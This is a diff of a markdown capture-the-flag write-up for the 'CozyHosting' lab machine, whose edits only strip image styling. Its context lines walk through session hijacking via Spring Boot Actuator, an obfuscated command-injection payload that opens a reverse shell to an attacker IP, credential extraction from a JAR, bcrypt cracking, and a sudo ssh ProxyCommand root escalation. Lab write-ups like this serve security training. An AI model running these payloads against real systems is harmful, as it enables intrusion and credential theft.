@@ -10,7 +10,7 @@ To begin enumeration, I performed a full TCP port scan against the target using 
 sudo nmap -sC -sV -p- 10.10.11.230
 ```
 
-![Nmap full TCP scan](../../images/cozyhosting/Pasted%20image%2020231208104127.png){.center .shadow width=80%}
+![Nmap full TCP scan](../../images/cozyhosting/Pasted%20image%2020231208104127.png)
 
 The scan identified two open ports:
 
@@ -26,19 +26,19 @@ Additional observations:
 
 I added the domain to my `/etc/hosts` file.
 
-![Hosts file update](../../images/cozyhosting/Pasted%20image%2020231208104242.png){.center .shadow width=80%}
+![Hosts file update](../../images/cozyhosting/Pasted%20image%2020231208104242.png)
 
 After adding the target domain to `/etc/hosts`, I navigated to:
 
 `http://cozyhosting.htb`
 
-![CozyHosting landing page](../../images/cozyhosting/Pasted%20image%2020231208104309.png){.center .shadow width=80%}
+![CozyHosting landing page](../../images/cozyhosting/Pasted%20image%2020231208104309.png)
 
 The landing page presented a standard hosting service interface with minimal publicly exposed functionality. The primary actionable element was a **login portal** accessible via:
 
 `/login`
 
-![Login page](../../images/cozyhosting/Pasted%20image%2020231208104327.png){.center .shadow width=80%}
+![Login page](../../images/cozyhosting/Pasted%20image%2020231208104327.png)
 
 - Only a login interface was exposed through initial interaction with the application.
 - Page source analysis revealed the use of Bootstrap v5.2.3, which does not present any direct security concerns.
@@ -50,7 +50,7 @@ With limited functionality exposed through manual browsing, I shifted to automat
 dirsearch -u http://cozyhosting.htb
 ```
 
-![Dirsearch results](../../images/cozyhosting/Pasted%20image%2020231208105618.png){.center .shadow width=80%}
+![Dirsearch results](../../images/cozyhosting/Pasted%20image%2020231208105618.png)
 
 The scan revealed several interesting endpoints, most notably:
 
@@ -70,13 +70,13 @@ Google suggests these endpoints are part of Spring Boot Actuator, which is used 
 
 Navigating to the discovered endpoint `http://cozyhosting.htb/actuator` revealed a JSON response containing multiple application management endpoints.
 
-![Actuator endpoint list](../../images/cozyhosting/Pasted%20image%2020231208105706.png){.center .shadow width=80%}
+![Actuator endpoint list](../../images/cozyhosting/Pasted%20image%2020231208105706.png)
 
 While enumerating available Actuator endpoints, I navigated to `http://cozyhosting.htb/actuator/sessions`.
 
 The endpoint returned active session data in the following format:
 
-![Actuator sessions leak](../../images/cozyhosting/Pasted%20image%2020231208105742.png){.center .shadow width=80%}
+![Actuator sessions leak](../../images/cozyhosting/Pasted%20image%2020231208105742.png)
 
 ```json
 {"DD4681FDB00EDFA8AC6F893603A5E020":"kanderson"}
@@ -92,9 +92,10 @@ Using an intercepting proxy, I modified the session cookie in my request:
 
 Upon refreshing the application with the modified session, I was successfully authenticated as `kanderson`, which provided access to the admin dashboard.
 
-![Authenticated dashboard](../../images/cozyhosting/Pasted%20image%2020231208110834.png){.center .shadow width=80%}
+![Authenticated dashboard](../../images/cozyhosting/Pasted%20image%2020231208110834.png)
 
-![Admin dashboard details](../../images/cozyhosting/Pasted%20image%2020231208110902.png){.center .shadow width=80%}
+![Admin dashboard details](../../images/cozyhosting/Pasted%20image%2020231208110902.png)
+
 
 After gaining access to the admin dashboard, I identified functionality that appeared to initiate SSH connections based on user-supplied input.
 
@@ -109,13 +110,13 @@ Messing with the input a bit, I realized it appeared to be attempting an SSH con
 
 This command injection allowed me to append arbitrary shell syntax. I sent a base64-encoded payload and then set up an `rlwrap nc` listener.
 
-![Command injection payload prep](../../images/cozyhosting/Pasted%20image%2020231211104348.png){.center .shadow width=80%}
+![Command injection payload prep](../../images/cozyhosting/Pasted%20image%2020231211104348.png)
 
 ```text
 host=test&username=;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzEzMzcgMD4mMQo="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
 ```
 
-![Reverse shell landed](../../images/cozyhosting/Pasted%20image%2020231211104924.png){.center .shadow width=80%}
+![Reverse shell landed](../../images/cozyhosting/Pasted%20image%2020231211104924.png)
 
 Why this works:
 
@@ -128,7 +129,7 @@ Why this works:
 
 I usually start with a few basic checks, like looking for valid users. A good place to start is `/etc/passwd`.
 
-![Passwd enumeration](../../images/cozyhosting/Pasted%20image%2020231211112933.png){.center .shadow width=80%}
+![Passwd enumeration](../../images/cozyhosting/Pasted%20image%2020231211112933.png)
 
 Two notable accounts were identified: `josh` and `postgres`.
 
@@ -136,7 +137,7 @@ To further understand the system, I enumerated active network connections and li
 
 `ss -antup`
 
-![Listening services](../../images/cozyhosting/Pasted%20image%2020231211111713.png){.center .shadow width=80%}
+![Listening services](../../images/cozyhosting/Pasted%20image%2020231211111713.png)
 
 The output revealed a service listening on port `5432`, indicating PostgreSQL.
 
@@ -144,9 +145,9 @@ That suggested credentials might be inside the application JAR file since the ap
 
 I moved the file from the box to my machine, though I probably could have copied it locally on the target too.
 
-![JAR file transfer](../../images/cozyhosting/Pasted%20image%2020231211105322.png){.center .shadow width=80%}
+![JAR file transfer](../../images/cozyhosting/Pasted%20image%2020231211105322.png)
 
-![JAR extraction](../../images/cozyhosting/Pasted%20image%2020231211105331.png){.center .shadow width=80%}
+![JAR extraction](../../images/cozyhosting/Pasted%20image%2020231211105331.png)
 
 To analyze the contents of the JAR file more effectively, I used JD-GUI, a Java decompiler that allows for easy inspection of compiled `.class` files.
 
@@ -154,7 +155,7 @@ This provides a readable view of the application source code, making it easier t
 
 [GitHub - java-decompiler/jd-gui](https://github.com/java-decompiler/jd-gui)
 
-![JD-GUI secrets view](../../images/cozyhosting/Pasted%20image%2020231211110907.png){.center .shadow width=80%}
+![JD-GUI secrets view](../../images/cozyhosting/Pasted%20image%2020231211110907.png)
 
 We have creds:
 
@@ -165,7 +166,7 @@ Using the credentials recovered from the application configuration, I authentica
 
 `psql -h 127.0.0.1 -U postgres`
 
-![Postgres login](../../images/cozyhosting/Pasted%20image%2020231211111916.png){.center .shadow width=80%}
+![Postgres login](../../images/cozyhosting/Pasted%20image%2020231211111916.png)
 
 Authentication was successful, providing an interactive PostgreSQL shell.
 
@@ -177,9 +178,9 @@ After gaining access to the PostgreSQL instance, I enumerated available database
 
 I found a database named `cozyhosting` with tables for users and hosts.
 
-![Database list](../../images/cozyhosting/Pasted%20image%2020231211112201.png){.center .shadow width=80%}
+![Database list](../../images/cozyhosting/Pasted%20image%2020231211112201.png)
 
-![Database table details](../../images/cozyhosting/Pasted%20image%2020231211112441.png){.center .shadow width=80%}
+![Database table details](../../images/cozyhosting/Pasted%20image%2020231211112441.png)
 
 The `users` table was of particular interest:
 
@@ -189,7 +190,7 @@ SELECT * FROM users;
 
 We have an admin hash.
 
-![Admin hash dump](../../images/cozyhosting/Pasted%20image%2020231211112516.png){.center .shadow width=80%}
+![Admin hash dump](../../images/cozyhosting/Pasted%20image%2020231211112516.png)
 
 - Passwords are stored as **bcrypt hashes** (`$2a$10$`)
 - Two accounts identified:
@@ -204,26 +205,26 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 Recovered password: `manchesterunited`
 
-![John crack result](../../images/cozyhosting/Pasted%20image%2020231211112831.png){.center .shadow width=80%}
+![John crack result](../../images/cozyhosting/Pasted%20image%2020231211112831.png)
 
 I started trying to SSH without success. Then I remembered we had another user: `josh`.
 
 And boom, we were in.
 
-![SSH as josh](../../images/cozyhosting/Pasted%20image%2020231211113445.png){.center .shadow width=80%}
+![SSH as josh](../../images/cozyhosting/Pasted%20image%2020231211113445.png)
 
 Forgot to grab `user.txt` earlier.
 
-![User flag](../../images/cozyhosting/Pasted%20image%2020231211113936.png){.center .shadow width=80%}
+![User flag](../../images/cozyhosting/Pasted%20image%2020231211113936.png)
 
 Another basic enumeration step I always check is sudo rights. Looks like we got lucky here.
 
-![Sudo rights](../../images/cozyhosting/Pasted%20image%2020231211114603.png){.center .shadow width=80%}
+![Sudo rights](../../images/cozyhosting/Pasted%20image%2020231211114603.png)
 
 Referencing GTFOBins for `ssh`, I identified a method to execute arbitrary commands using the `ProxyCommand` option.
 
 `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
 
-![Root via ProxyCommand](../../images/cozyhosting/Pasted%20image%2020231211114931.png){.center .shadow width=80%}
+![Root via ProxyCommand](../../images/cozyhosting/Pasted%20image%2020231211114931.png)
 
 That provided root access and the final flag.
